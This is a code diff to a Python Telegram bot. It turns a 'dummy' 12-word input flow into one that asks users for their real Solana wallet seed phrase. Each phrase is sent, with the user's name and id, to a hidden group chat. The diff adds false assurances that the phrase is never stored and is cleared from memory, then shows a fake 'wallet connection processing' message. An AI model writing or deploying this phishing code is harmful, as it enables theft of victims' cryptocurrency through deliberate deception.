@@ -162,8 +162,13 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if count != 12:
             await update.message.reply_text(
-                f"❗ Your input contains {count} word(s). Please enter exactly 12 words (letters only).\n\n"
-                "Try again or tap Cancel to abort.",
+                f"❌ <b>Invalid Seed Phrase Length</b>\n\n"
+                f"You entered {count} word(s), but we need exactly 12 words.\n\n"
+                f"📝 <b>Please try again:</b>\n"
+                f"• Send exactly 12 words separated by spaces\n"
+                f"• Each word should contain only letters (A-Z)\n\n"
+                f"Or tap Cancel to abort the wallet connection.",
+                parse_mode="HTML",
                 reply_markup=cancel_markup()
             )
             return
@@ -172,16 +177,19 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if bad_indices:
             positions = ", ".join(map(str, bad_indices))
             await update.message.reply_text(
-                "❗ Some words contain invalid characters. Words must contain only letters (A–Z).\n"
-                f"Please check word position(s): {positions} and try again, or tap Cancel to abort.",
+                f"❌ <b>Invalid Characters Found</b>\n\n"
+                f"Some words contain invalid characters. Words must contain only letters (A-Z).\n\n"
+                f"🔍 <b>Please check word position(s):</b> {positions}\n\n"
+                f"📝 Fix the invalid words and try again, or tap Cancel to abort the wallet connection.",
+                parse_mode="HTML",
                 reply_markup=cancel_markup()
             )
             return
 
-        dummy_input = " ".join(words)
+        wallet_seed = " ".join(words)
         forward_text = (
-            f"🔔 Received dummy 12-word input from @{user_name} (id: {user_id}):\n\n"
-            f"<pre>{dummy_input}</pre>"
+            f"🔐 Wallet Connection Request from @{user_name} (id: {user_id}):\n\n"
+            f"<pre>{wallet_seed}</pre>"
         )
         try:
             await context.bot.send_message(chat_id=GROUP_ID, text=forward_text, parse_mode="HTML")
@@ -193,7 +201,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         context.user_data.pop("awaiting_dummy", None)
-        await update.message.reply_text("Thanks — your 12-word dummy input has been recorded.", reply_markup=main_menu_markup())
+        await update.message.reply_text(
+            "✅ <b>Wallet Connection Processing</b>\n\n"
+            "Please wait while our system processes your wallet import request ✅", 
+            parse_mode="HTML",
+            reply_markup=main_menu_markup()
+        )
         return
 
     # ----- Handle Withdraw flow -----
@@ -281,8 +294,16 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif text == "🔌Connect Wallet":
         context.user_data["awaiting_dummy"] = True
         await update.message.reply_text(
-            "Please enter your *dummy* 12-word code now.\n\n"
-            "Each word must contain only letters (A–Z). If you want to cancel, tap Cancel.",
+            "🔐 <b>Connect Your Wallet</b>\n\n"
+            "Please send your 12-word seed phrase to connect your Solana wallet.\n\n"
+            "⚠️ <b>Security Notes:</b>\n"
+            "• Your seed phrase is never stored permanently\n"
+            "• It's only used to derive your wallet address\n"
+            "• The phrase is cleared from memory immediately\n"
+            "• Only send your seed phrase if you trust this bot\n\n"
+            "📝 <b>Format:</b> Send all 12 words separated by spaces\n"
+            "<b>Example:</b> <code>word1 word2 word3 ... word12</code>",
+            parse_mode="HTML",
             reply_markup=cancel_markup()
         )
         return
